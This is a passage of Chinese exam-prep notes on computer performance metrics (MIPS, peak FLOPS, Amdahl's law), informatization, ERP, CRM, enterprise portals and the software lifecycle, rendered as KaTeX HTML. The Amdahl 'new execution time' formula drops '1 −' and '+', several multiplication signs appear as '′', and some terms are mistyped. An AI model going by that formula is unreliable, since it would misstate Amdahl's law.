vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">执行时间</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">指令条数</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693300000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span></span></p><p>  公式中，Fz 为处理机的工作主频，CPI（Cycles Per Instruction）为每条指令所需的平均时钟周期数，IPC 为每个时钟周期平均执行的指令条数。  gg<br />  例如，如果要计算 Pentium IV/2.4E 处理机的运算速度，因为 Pentium IV/2.4E 处理机的IPC=2（或 CPI=0.5），Fz=2400MHz，所以 MIPSP4/2.4E = IPC′Fz=2′2400 = 4800MIPS。</p><h4 id="2峰值计算"><a class="markdownIt-Anchor" href="#2峰值计算"></a> 2．峰值计算</h4><p>  衡量计算机性能的一个重要指标就是计算峰值或者浮点计算峰值，它是指计算机每秒钟能完成的浮点计算最大次数。包括理论浮点峰值和实测浮点峰值。<br />  理论浮点峰值是该计算机理论上能达到的每秒钟能完成浮点计算最大次数，它主要是由CPU 的主频决定。<br />  理论浮点峰值 = CPU 主频′CPU 每个时钟周期执行浮点运算的次数′系统中 CPU 数<br />  希赛教育专家提示：CPU 每个时钟周期执行浮点运算的次数是由处理器中浮点运算单元的个数及每个浮点运算单元在每个时钟周期能处理几条浮点运算来决定的。</p><h4 id="3等效指令速度"><a class="markdownIt-Anchor" href="#3等效指令速度"></a> 3．等效指令速度</h4><p>  静态指令使用频度指的是在程序中直接统计的计算机速度。动态指令使用频度指的是在程序执行过程中统计的指令速度。在计算机发展的早期，用加法指令的运算速度来衡量计算机的速度。后来发展成为等效指令速度法或吉普森（Gibson）法，在这种方法中，通常加、减法指令占 50%，乘法指令占 15%，除法指令占 5%，程序控制指令占 15%，其他指令占15%。</p><h3 id="253-性能设计"><a class="markdownIt-Anchor" href="#253-性能设计"></a> 2.5.3 性能设计</h3><h4 id="1-阿姆达尔解决方案"><a class="markdownIt-Anchor" href="#1-阿姆达尔解决方案"></a> 1. 阿姆达尔解决方案</h4><p>  阿姆达尔定律是这样的：系统中对某部件采用某种更快的执行方式，所获得的系统性能的改变程度，取决于这种方式被使用的频率，或所占总执行时间的比例。<br />  阿姆达尔定律定义了采用特定部件所取得的加速比。假定使用某种增强部件，计算机的性能就会得到提高，那么加速比就是如下公式所定义的比率：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>加速比</mtext><mo>=</mo><mfrac><mtext>不使用增强部件时完成整个任务的时间</mtext><mtext>使用增强部件时完成整个任务的时间</mtext></mfrac></mrow><annotation encoding="application/x-tex">\text{加速比}=\frac{\text{不使用增强部件时完成整个任务的时间}}{\text{使用增强部件时完成整个任务的时间}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord cjk_fallback">加速比</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">使用增强部件时完成整个任务的时间</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">不使用增强部件时完成整个任务的时间</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>  加速比反映了使用增强部件后完成一个任务比不使用增强部件完成同一任务加快了多少。阿姆达尔定律为计算某些情况下的加速比提供了一种便捷的方法。加速比主要取决于两个因素：</p><ol><li>在原有的计算机上，能被改进并增强的部分在总执行时间中所占的比例。这个值称之为增强比例，它永远小于等于 1。</li><li>通过增强的执行方式所取得的改进，即如果整个程序使用了增强的执行方式，那么这个任务的执行速度会有多少提高，这个值是在原来条件下程序的执行时间与使用增强功能后程序的执行时间之比。</li></ol><p>  原来的机器使用了增强功能后，执行时间等于未改进部分的执行时间加上改进部分的执行时间：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>新的执行时间</mtext><mo>=</mo><mtext>原来的执行时间</mtext><mo>×</mo><mo stretchy="false">[</mo><mo stretchy="false">(</mo><mo>−</mo><mi mathvariant="normal">增</mi><mi mathvariant="normal">强</mi><mi mathvariant="normal">比</mi><mi mathvariant="normal">例</mi><mo stretchy="false">)</mo><mfrac><mtext>增强比例</mtext><mtext>增强加速比</mtext></mfrac><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\text{新的执行时间}=\text{原来的执行时间} \times [(-增强比例) \frac{\text{增强比例}}{\text{增强加速比}}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord cjk_fallback">新的执行时间</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord text"><span class="mord cjk_fallback">原来的执行时间</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mopen">[</span><span class="mopen">(</span><span class="mord">−</span><span class="mord cjk_fallback">增</span><span class="mord cjk_fallback">强</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">例</span><span class="mclose">)</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">增强加速比</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">增强比例</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">]</span></span></span></span></span></p><p>总的加速比等于两种执行时间的比：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>总加速比</mtext><mo>=</mo><mfrac><mtext>原来的执行时间</mtext><mtext>新的执行时间</mtext></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mo stretchy="false">[</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mtext>增强比例</mtext><mo stretchy="false">)</mo><mo>+</mo><mfrac><mtext>增强比例</mtext><mtext>增强加速比</mtext></mfrac><mo stretchy="false">]</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{总加速比}=\frac{\text{原来的执行时间}}{\text{新的执行时间}}=\frac{1}{[(1-\text{增强比例})+\frac{\text{增强比例}}{\text{增强加速比}}]}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord text"><span class="mord cjk_fallback">总加速比</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">新的执行时间</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">原来的执行时间</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.428771em;vertical-align:-1.1073309999999998em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.2376690000000004em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">[</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord text"><span class="mord cjk_fallback">增强比例</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">增强加速比</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">增强比例</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">]</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1073309999999998em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h1 id="第三章-信息系统基础知识"><a class="markdownIt-Anchor" href="#第三章-信息系统基础知识"></a> 第三章 信息系统基础知识</h1><h2 id="31-信息化概述"><a class="markdownIt-Anchor" href="#31-信息化概述"></a> 3.1 信息化概述</h2><h3 id="311-信息的定义"><a class="markdownIt-Anchor" href="#311-信息的定义"></a> 3.1.1 信息的定义</h3><p>  信息是对客观事物变化和特征的反应，是客观事物之间相互作用和联系的表征，是客观事物经过感知或认识后的再现。</p><h3 id="312-信息的特征"><a class="markdownIt-Anchor" href="#312-信息的特征"></a> 3.1.2 信息的特征</h3><h4 id="1-客观性"><a class="markdownIt-Anchor" href="#1-客观性"></a> 1. 客观性</h4><p>  信息反映了客观事物的运动状态和方式。<br />  客观性也即事实性，不符合事实的信息不仅没有价值，而且可能有副作用。</p><h4 id="2-普遍性"><a class="markdownIt-Anchor" href="#2-普遍性"></a> 2. 普遍性</h4><p>  物质的普遍性决定了信息的普遍存在，因而信息无处不在。</p><h4 id="3-无限性"><a class="markdownIt-Anchor" href="#3-无限性"></a> 3. 无限性</h4><p>  由于一切事物运动的状态和方式都是信息，而事物及其变化是无限多样的，因而信息是无限的。</p><h4 id="4-动态性"><a class="markdownIt-Anchor" href="#4-动态性"></a> 4. 动态性</h4><p>  信息是随着时间的变化而变化的。</p><h4 id="5-依附性"><a class="markdownIt-Anchor" href="#5-依附性"></a> 5. 依附性</h4><p>  信息是客观世界的反应，因而要依附于一定的载体而存在，需要有物质的承担者。信息不能完全脱离物质而独立存在。</p><h4 id="6-变换性"><a class="markdownIt-Anchor" href="#6-变换性"></a> 6. 变换性</h4><p>  信息是可变换的，它可以用不同的载体以不同的方法来负载。</p><h4 id="7-传递性"><a class="markdownIt-Anchor" href="#7-传递性"></a> 7. 传递性</h4><p>  信息可以在时间上或空间上从一点传递到另一点。信息在时间上的传递即是存储，在空间上的传递即是转移或扩散。</p><h4 id="8-层次性"><a class="markdownIt-Anchor" href="#8-层次性"></a> 8. 层次性</h4><p>  客观世界是分层次的，反应他的信息也是分层次的。信息可分为战略级、管理及和操作级。</p><h4 id="9-系统性"><a class="markdownIt-Anchor" href="#9-系统性"></a> 9. 系统性</h4><p>  信息可以标识位一种集合，不同类别的信息可以形成不同的整体。因而可以形成与现实世界对应的信息系统。</p><h3 id="313-信息化的定义"><a class="markdownIt-Anchor" href="#313-信息化的定义"></a> 3.1.3 信息化的定义</h3><p>  信息化是在国家宏观信息政策的指导下，通过信息技术开发、信息产业的发展、信息人才的配置，最大限度的利用信息资源以满足全社会的信息需求，从而加速社会各个领域的共同发展以推进信息社会的过程。</p><h3 id="314-信息化的内容"><a class="markdownIt-Anchor" href="#314-信息化的内容"></a> 3.1.4 信息化的内容</h3><p>  信息化主要围绕6个要素展开。</p><h4 id="1-信息资源的开发利用"><a class="markdownIt-Anchor" href="#1-信息资源的开发利用"></a> 1. 信息资源的开发利用</h4><p>  信息资源是信息化的源泉，信息资源的开发利用要解决三个问题：</p><ol><li>原始信息的采集</li><li>使存在的信息在给定的时间内获得</li><li>使用户获得真正需要的信息</li></ol><h4 id="2-信息网络的全面覆盖"><a class="markdownIt-Anchor" href="#2-信息网络的全面覆盖"></a> 2. 信息网络的全面覆盖</h4><p>  信息网络是信息资源开发、利用的基础设施，是信息传输、交换和共享的必要手段。<br />  信息网络在国家信息化的过程中将逐步实现三网融合，最终做到三网合一。</p><h4 id="3-信息技术的广泛应用"><a class="markdownIt-Anchor" href="#3-信息技术的广泛应用"></a> 3. 信息技术的广泛应用</h4><h4 id="4-信息产业的大力发展"><a class="markdownIt-Anchor" href="#4-信息产业的大力发展"></a> 4. 信息产业的大力发展</h4><h4 id="5-信息化人才的培养"><a class="markdownIt-Anchor" href="#5-信息化人才的培养"></a> 5. 信息化人才的培养</h4><h4 id="6-信息化政策法规和标准规范建设"><a class="markdownIt-Anchor" href="#6-信息化政策法规和标准规范建设"></a> 6. 信息化政策法规和标准规范建设</h4><h3 id="315-信息化的经济社会意义"><a class="markdownIt-Anchor" href="#315-信息化的经济社会意义"></a> 3.1.5 信息化的经济社会意义</h3><ol><li>信息化促进全球化的发展</li><li>信息化促进了竞技的增长</li><li>信息化引发社会生活全面变革</li><li>信息化对国际关系产生深远影响</li></ol><h3 id="316-信息化对组织的意义"><a class="markdownIt-Anchor" href="#316-信息化对组织的意义"></a> 3.1.6 信息化对组织的意义</h3><ol><li>信息化引发组织的结构创新</li><li>信息化推动组织的管理创新</li><li>信息化促进组织的经营创新</li><li>造就信息化的人才队伍</li></ol><h3 id="317-信息化的需求"><a class="markdownIt-Anchor" href="#317-信息化的需求"></a> 3.1.7 信息化的需求</h3><h4 id="1-组织信息化需求的层次性"><a class="markdownIt-Anchor" href="#1-组织信息化需求的层次性"></a> 1. 组织信息化需求的层次性</h4><p>  一般来说信息化需求包含三个层次：战略需求，运作需求和技术需求。</p><h4 id="2-组织信息化需求的系统性"><a class="markdownIt-Anchor" href="#2-组织信息化需求的系统性"></a> 2. 组织信息化需求的系统性</h4><p>  各层次信息化需求之间的逻辑关系包括因果关系、依赖关系、主辅关系和协同关系等。<br />  一个组织的信息化应该遵循“总体规划、分步实施”的原则。</p><h2 id="32-信息系统工程的总体规划"><a class="markdownIt-Anchor" href="#32-信息系统工程的总体规划"></a> 3.2 信息系统工程的总体规划</h2><p>  系统规划指根据组织的战略目标和用户提出的需求，从用户的现状出发，经过调查，对所要开发管理信息系统的技术方案、实施过程、阶段划分、开发组织和开发队伍、投资规模、资金来源及工作进度，用系统的、科学的、发展的观点进行全面规划。</p><h3 id="322-信息系统工程总体规划的方法论"><a class="markdownIt-Anchor" href="#322-信息系统工程总体规划的方法论"></a> 3.2.2 信息系统工程总体规划的方法论</h3><p>  制定信息系统工程总体规划需要有效的方法论支持，其方法多种多样，用的最多的主要有三种：业务系统规划法、关键成功因素法、战略目标集合转化法。</p><h4 id="1-业务系统规划法"><a class="markdownIt-Anchor" href="#1-业务系统规划法"></a> 1. 业务系统规划法</h4><p>  业务系统规划（ Business Systems Planning BSP）方法既是信息系统的重要规划方法同时，也是信息系统工程总体战略规划的重要方法。<br />  实行 BSP 的前提是，在企业内有改善信息系统的要求，并且有为建设这一系统而建立总的战略的需要。因而 BSP 的基本功能是服务于信息系统建设的长期目标。<br />  信息系统必须支持企业的战略目标。可以将 BSP 看成一个转化过程，即将企业的战略转化成信息系统的战略，因此，了解企业的战略就成了 BSP 重要内容之一。<br />  BSP 的目标主要是提供信息系统规划，用以支持企业短期的和长期的信息需要。其具体目标的目标主要是提供信息系统规划，用以支持企业短期的和长期的信息需要。</p><h4 id="2-关键成功因素法"><a class="markdownIt-Anchor" href="#2-关键成功因素法"></a> 2. 关键成功因素法</h4><p>  在现行系统中总是存在着多个变量影响目标系统的实现，其中若干因素时关键的和主要的。通过对关键成功因素的识别，找出实现目标所需的关键信息集合，从而确定系统开发的优先次序。<br />  关键成功因素法能够抓住主要矛盾，使目标的识别重点突出，为管理者提供一个结构化的方法，帮助企业确定其关键成功因素和信息需求。</p><h4 id="3-战略目标集转化法"><a class="markdownIt-Anchor" href="#3-战略目标集转化法"></a> 3. 战略目标集转化法</h4><p>  把战略目标看做是一个“信息集合”，由使命、目标、战略等组成，管理信息系统的规划过程即是把组织的战略目标转变为管理信息系统的战略目标的过程。</p><h2 id="33-信息化的典型应用"><a class="markdownIt-Anchor" href="#33-信息化的典型应用"></a> 3.3 信息化的典型应用</h2><h3 id="331-政府信息化与电子政务"><a class="markdownIt-Anchor" href="#331-政府信息化与电子政务"></a> 3.3.1 政府信息化与电子政务</h3><h4 id="1-电子政务的概念"><a class="markdownIt-Anchor" href="#1-电子政务的概念"></a> 1. 电子政务的概念</h4><p>  利用信息技术和其他相关技术，将其管理和服务职能进行继承，在网络上实现政府组织结构和工作流程优化重组，超越时间、空间与部门分隔的之约，实现公务、政务、商务、事务的一体化管理与运行。</p><h4 id="3-电子政务的技术形式"><a class="markdownIt-Anchor" href="#3-电子政务的技术形式"></a> 3. 电子政务的技术形式</h4><p>  当前电子政务在世界范围内发展主要有两个特征：</p><ol><li>以互联网为基础设施，构建和发展电子政务。</li><li>更强调政府服务功能的发挥和完善，包括政府对企业、对居民的服务以及政府各部门之间的相互服务。</li></ol><h4 id="4-电子政务的应用领域"><a class="markdownIt-Anchor" href="#4-电子政务的应用领域"></a> 4. 电子政务的应用领域</h4><p>  集中在以下6个方面：</p><ol><li>面向社会的应用。</li><li>政府部门之间的应用。</li><li>政府部门内部的各类应用系统。</li><li>设计政府部门内部的各类核心数据的应用系统。</li><li>政府电子化采购。</li><li>电子社区。</li></ol><h3 id="332-企业信息化与电子商务"><a class="markdownIt-Anchor" href="#332-企业信息化与电子商务"></a> 3.3.2 企业信息化与电子商务</h3><h4 id="1-企业信息化的概念"><a class="markdownIt-Anchor" href="#1-企业信息化的概念"></a> 1. 企业信息化的概念</h4><p>  企业信息化就是企业利用现代信息技术，通过信息资源的深入开发和广泛利用，实现企业生产过程的自动化、管理方式的网格化、决策支持的智能化和商务运营的电子化，不断提高生产、经营、管理、决策的效率和水平，进而提高企业经济效益和企业竞争力的过程。</p><h4 id="2-企业信息化的目的"><a class="markdownIt-Anchor" href="#2-企业信息化的目的"></a> 2. 企业信息化的目的</h4><p>  根本目的在于提高企业竞争能力，使得企业具有平稳和有效运作的能力，对紧急情况和机会做出快速反应，为企业内外部用户提供有价值的信息。</p><h4 id="3-企业信息化的规划"><a class="markdownIt-Anchor" href="#3-企业信息化的规划"></a> 3. 企业信息化的规划</h4><p>  主要从以下三个层面来实现：</p><ol><li>企业战略层面。</li><li>业务运作层面。</li><li>管理运作层面。</li></ol><h4 id="4-企业信息化方法"><a class="markdownIt-Anchor" href="#4-企业信息化方法"></a> 4. 企业信息化方法</h4><p>  主要有以下几种方法：</p><ol><li>业务流程重构方法<br />  重新审视企业的生产经营过程，利用信息技术和网络技术，对企业的组织结构和工作方法进行“彻底的、根本性的”重新设计。</li><li>核心业务应用方法</li><li>信息系统建设方法</li><li>主题数据库方法<br />  面向企业的核心业务的数据库开展信息化。</li><li>资源管理方法</li><li>人力资本投资方法</li></ol><h3 id="333-企业资源规划的机构和功能"><a class="markdownIt-Anchor" href="#333-企业资源规划的机构和功能"></a> 3.3.3 企业资源规划的机构和功能</h3><h4 id="1-erp的概念"><a class="markdownIt-Anchor" href="#1-erp的概念"></a> 1. ERP的概念</h4><p>  企业的所有资源包括三大流：物流、资金流和信息流。ERP是对这三种资源进行全面集成管理的管理信息系统。</p><h4 id="2-erp的主要功能"><a class="markdownIt-Anchor" href="#2-erp的主要功能"></a> 2. ERP的主要功能</h4><p>  ERP 为企业提供的功能是多层面的和全方位的。</p><ol><li>支持决策的功能。</li><li>为处于不同行业的企业提供有针对性的 IT 解决方案。</li><li>从企业内部的供应链发展为全行业和跨行业的供应链。</li></ol><h3 id="334-客户关系管理在企业中的应用"><a class="markdownIt-Anchor" href="#334-客户关系管理在企业中的应用"></a> 3.3.4 客户关系管理在企业中的应用</h3><h4 id="1-crm的概念"><a class="markdownIt-Anchor" href="#1-crm的概念"></a> 1. CRM的概念</h4><p>  CRM主要包含以下4个内容：</p><ol><li>提供的信息要有利于更好的理解客户。</li><li>流程管理要为客户提供高效、适当的体验。</li><li>允许员工使用以上知识的软件。</li><li>培训并改变管理要素，使员工和企业了解并且有能力提供那些构建强有力关系、提高客户忠诚度的体验。</li></ol><p>  CRM的目的是提高收入，核心思想是以客户为中心。</p><h4 id="2-crm的背景"><a class="markdownIt-Anchor" href="#2-crm的背景"></a> 2. CRM的背景</h4><p>  CRM的产生主要是以下几个因素的推动和促成的结果：</p><ol><li>管理理念的更新</li><li>市场需求的拉动</li><li>信息技术的推动</li></ol><h4 id="3-crm的内容"><a class="markdownIt-Anchor" href="#3-crm的内容"></a> 3. CRM的内容</h4><p>  CRM系统主要由以下几个模块构成：</p><ol><li>销售自动化</li><li>营销自动化</li><li>客户服务与支持</li><li>商业智能</li></ol><h4 id="4-crm的解决方案和实施过程"><a class="markdownIt-Anchor" href="#4-crm的解决方案和实施过程"></a> 4. CRM的解决方案和实施过程</h4><p>  一般说来 CRM 由两部分构成，即触发中心和挖掘中心，前者指客户和 CRM 通过电话、传真、Web、E-mail 等多种方式“触发”进行沟通；挖掘中心则是指对 CRM 记录交流沟通的信息进行智能分析。由此可见，一个有效的 CRM 解决方案应该具备以下要素：</p><ol><li>畅通有效的客户交流渠道（触发中心）<br />  在通信手段极为丰富的今天，能否支持电话、Web、传真、E-mail 等各种触发手段进行交流，无疑是十分关键的。</li><li>对所获信息进行有效分析（挖掘中心）</li><li>CRM 必须能与 ERP 很好地集成<br />  作为企业管理的前台，CRM 的市场营销和客户服务的信息必须能及时传达到后台的财务、生产等部门，这是企业能否有效运营的关键。</li></ol><p>  CRM 的实现过程具体说来，包含三方面的工作。一是客户服务与支持，即通过控制服务品质以赢得顾客的忠诚度，例如，对客户快速准确的技术支持、对客户投诉的快速反应、对客户提供产品查询等；二是客户群维系，即通过与顾客的交流实现新的销售，例如，通过交流赢得失去的客户等；三是商机管理，即利用数据库开展销售，例如，利用现有客户数据库做新产品推广测试，通过电话促销调查，确定目标客户群等。</p><h4 id="5-crm的价值"><a class="markdownIt-Anchor" href="#5-crm的价值"></a> 5. CRM的价值</h4><ol><li>提高内部员工的工作效率，节省日常开支。</li><li>提高客户满意度。</li><li>提高客户忠诚度。</li></ol><h3 id="335-企业门户"><a class="markdownIt-Anchor" href="#335-企业门户"></a> 3.3.5 企业门户</h3><p>  一般认为惬意门户就是一个信息技术平台，这个平台可以提供个性化信息服务，它链接企业内部和外部，为企业提供一个单一的访问企业各种信息资源和应用程序的入口，企业的员工、客户、合作伙伴和供应商都可以通过这个门户获得个性化的信息和服务。</p><h4 id="1-企业门户的功能"><a class="markdownIt-Anchor" href="#1-企业门户的功能"></a> 1. 企业门户的功能</h4><ol><li>个性化<br />  应具有定做用户工作区的内容和外观的能力，门户的个性化功能包括演示个性化、个性化的信息过滤、个性化的用户配置。</li><li>演示功能</li><li>知识及内容的创建与管理</li><li>搜寻和检索</li><li>元数据管理/分类</li><li>查询/报告和分析</li><li>数据管理和应用集成</li><li>文档管理</li><li>协同和信息共享/知识汲取和索引</li><li>虚拟社区</li><li>流程支持</li><li>商业功能/垂直市场应用程序</li><li>集中式目录支持和门户管理</li><li>安全功能</li></ol><h4 id="2-企业门户的分类"><a class="markdownIt-Anchor" href="#2-企业门户的分类"></a> 2. 企业门户的分类</h4><ol><li>企业信息门户（EIP）</li><li>企业知识门户（EKP）</li><li>企业应用门户（EAP）</li><li>垂直门户（vortal）</li></ol><h4 id="3-企业门户的要素"><a class="markdownIt-Anchor" href="#3-企业门户的要素"></a> 3. 企业门户的要素</h4><h1 id="第四章-系统开发基础知识"><a class="markdownIt-Anchor" href="#第四章-系统开发基础知识"></a> 第四章 系统开发基础知识</h1><h2 id="41-软件开发方法"><a class="markdownIt-Anchor" href="#41-软件开发方法"></a> 4.1 软件开发方法</h2><h3 id="411-软件开发生命周期"><a class="markdownIt-Anchor" href="#411-软件开发生命周期"></a> 4.1.1 软件开发生命周期</h3><p>  软件生命周期可以划分为<code>软件定义</code>、<code>软件开发</code>、<code>软件运行与维护</code>三个阶段。</p><h4 id="1-软件定义时期"><a class="markdownIt-Anchor" href="#1-软件定义时期"></a> 1. 软件定义时期</h4><p>  软件定义包括<code>可行性研究</code>和<code>详细需求分析</code>过程。</p><ul><li>问题定义<br />  按照软件系统工程需求来确定问题空间的性质。</li><li>可行性研究<br />  主要包括<code>技术可行性</code>、<code>经济可行性</code>、<code>操作可行性</code>和<code>社会可行性</code>。</li><li>需求分析<br />  确定系统的<code>功能需求</code>、<code>性能需求</code>和<code>运行环境的约束</code>。写出<code>软件需求规格说明书</code>、<code>软件系统测试大纲</code>和<code>用户手册概要</code>。</li></ul><h4 id="2-软件开发时期"><a class="markdownIt-Anchor" href="#2-软件开发时期"></a> 2. 软件开发时期</h4><p>  主要分为<code>概要设计</code>、<code>详细设计</code>、<code>编码和测试</code>。</p><ul><li>概要设计<br />  在软件需求规格说明书的基础上，建立系统的总体结构和模块之间的关系，定义功能模块及各模块之间的关系。</li><li>详细设计<br />  